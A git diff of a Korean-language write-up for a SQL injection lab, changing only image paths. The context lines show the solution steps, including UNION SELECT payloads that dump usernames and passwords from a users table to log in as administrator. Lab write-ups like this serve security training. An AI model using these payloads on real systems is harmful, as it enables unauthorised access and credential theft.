@@ -1,6 +1,6 @@
 # Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
-![title](../../images/SQL_Injection/Lab06_title.png)
+![title](../../image/SQL_Injection/Lab06_title.png)
 
 ## Difficulty
 
@@ -64,9 +64,9 @@ carlos~qwerty
 -> 컬럼 개수: 2
 3. '+UNION+SELECT+'test','test'-- 이용하여 문자열 출력되는 컬럼 확인
 4. '+UNION+SELECT+NULL,username||'~'||password+FROM+users-- 사용하여 users 테이블에 있는 username, password 컬럼 값 출력<br/>
-![payload](../../images/SQL_Injection/Lab06_payload.png)
+![payload](../../image/SQL_Injection/Lab06_payload.png)
 5. 출련된 정보 이용해 administrator 계정으로 로그인<br/>
-![result](../../images/SQL_Injection/Lab06_result.png)
+![result](../../image/SQL_Injection/Lab06_result.png)
 
 ---
 
